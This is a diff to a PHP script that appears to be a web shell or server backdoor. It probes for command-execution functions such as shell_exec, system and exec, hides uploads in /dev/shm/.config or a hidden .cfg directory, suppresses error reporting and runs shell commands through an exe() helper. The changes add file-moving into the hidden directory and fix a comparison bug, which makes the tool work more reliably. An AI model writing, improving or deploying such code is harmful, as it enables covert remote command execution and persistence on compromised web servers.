@@ -1,6 +1,6 @@
 <?php 
 ini_set('max_execution_time', 0);
-//error_reporting(0);
+error_reporting(0);
 
 $funclist=array('shell_exec','system','passthru','proc_open','popen','exec');
 $fncmaster="";
@@ -25,17 +25,27 @@ if(!file_exists($upload_cli)) {
     if(!file_exists($upload_cli)) {
         $upload_cli=".cfg";
         if(!file_exists($upload_cli)) {
-            @mkdir($upload_cli);
+            if(file_exists("-"))
+                exe("mv -/* $upload_cli");
+
+            if(!file_exists($upload_cli))
+                @mkdir($upload_cli);
+                
             if(!file_exists($upload_cli))
                 $upload_cli="";
         }
     }
 }
 
-if ($upload_cli="/dev/shm/.config") {
+if ($upload_cli=="/dev/shm/.config") {
     $upload_dir=".cfg";
     if(!file_exists($upload_dir)) {
-        @mkdir($upload_dir);
+        if(file_exists("-"))
+            exe("mv -/* $upload_dir");
+
+        if(!file_exists($upload_dir))
+            @mkdir($upload_dir);
+
         if(!file_exists($upload_dir))
             $upload_dir="";
     }
@@ -43,9 +53,7 @@ if ($upload_cli="/dev/shm/.config") {
     $upload_dir=$upload_cli;
 
 
-// if($upload_dir!="" && file_exists("-")) {
-//     exe("mv -/* $upload_dir");
-// }
+
 
 //echo("updir: $upload_dir\n");
 //echo("upcli: $upload_cli");
@@ -60,12 +68,11 @@ term;
 
 get_cpu_info();
 
-$link="./";
-if(isset($_SERVER['REQUEST_URI'])) {
-	$tmp=$_SERVER['REQUEST_URI'];
-	$p=strripos($tmp,"/");
-	$link=substr($tmp,0,$p) . "/$upload_dir";
-}
+$tmp=$_SERVER['REQUEST_URI'];
+
+$p=strripos($tmp,"/");
+$link=substr($tmp,0,$p) . "/$upload_dir";
+$a=Array();$b=Array();
 
 if(isset($_GET["upd"])) {
 
@@ -196,7 +203,7 @@ if ($tmp != "") {
         if($tmp2=="cli")
             echo "uploaded to $tmp3\n";
         else
-            echo "uploaded to <a href='$link'>$link</a>\n";
+            echo "uploaded to <a href='$link' target='_blank'>$link</a>\n";
     }
     else 
        die("ERROR: upload failed!");
@@ -414,5 +421,4 @@ function exe($cmd)
       //  echo $final;
     return $final;
 }
-
 
